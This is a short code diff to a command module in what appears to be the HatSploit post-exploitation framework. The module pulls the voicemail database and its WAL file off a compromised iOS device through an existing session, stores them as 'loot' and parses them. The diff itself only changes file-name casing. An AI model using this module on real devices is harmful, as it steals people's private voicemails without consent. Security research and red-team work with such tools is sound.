@@ -28,23 +28,23 @@ class HatSploitCommand(Command):
 
         self.db = DB()
 
-        self.db_file = '/private/var/mobile/Library/Voicemail/Voicemail.db'
-        self.wal_file = '/private/var/mobile/Library/Voicemail/Voicemail.db-wal'
+        self.db_file = '/private/var/mobile/Library/Voicemail/voicemail.db'
+        self.wal_file = '/private/var/mobile/Library/Voicemail/voicemail.db-wal'
 
     def run(self, argc, argv):
         if not self.session.download(
-                self.db_file, Loot().specific_loot('VoiceMail.db')):
+                self.db_file, Loot().specific_loot('voicemail.db')):
             return
 
         if not self.session.download(
-                self.wal_file, Loot().specific_loot('VoiceMail.db-wal')):
+                self.wal_file, Loot().specific_loot('voicemail.db-wal')):
             return
 
         self.print_process("Parsing voicemail database...")
 
         try:
             voicemail = self.db.parse_voicemail(
-                Loot().specific_loot('VoiceMail.db'))
+                Loot().specific_loot('voicemail.db'))
         except Exception:
             self.print_error("Failed to parse voicemail database!")
             return
